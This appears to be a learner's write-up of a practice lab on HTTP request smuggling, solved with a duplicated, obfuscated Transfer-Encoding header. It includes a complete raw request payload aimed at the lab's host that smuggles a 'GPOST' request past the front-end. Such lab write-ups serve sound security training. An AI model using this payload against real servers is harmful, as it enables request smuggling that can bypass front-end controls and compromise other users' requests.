# Practitioner Lab 127: HTTP request smuggling, obfuscating the TE header

---

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

Using the scanner I was able to identify if it was CLTE OR TECL

![Untitled](Practitioner%20Lab%20127%20HTTP%20request%20smuggling,%20obfus%206b3eecc1d24745a6b146562787304e86/Untitled.png)

I then crafter a payload similar to my previous one but this time it had the double transfer-encoding

```
POST / HTTP/1.1
Host: 0a6400bd0315e300803d9e9d004700aa.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

57
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-length: 15

0

```

When I sent this request twice I managed to solve the lab.

![Untitled](Practitioner%20Lab%20127%20HTTP%20request%20smuggling,%20obfus%206b3eecc1d24745a6b146562787304e86/Untitled%201.png)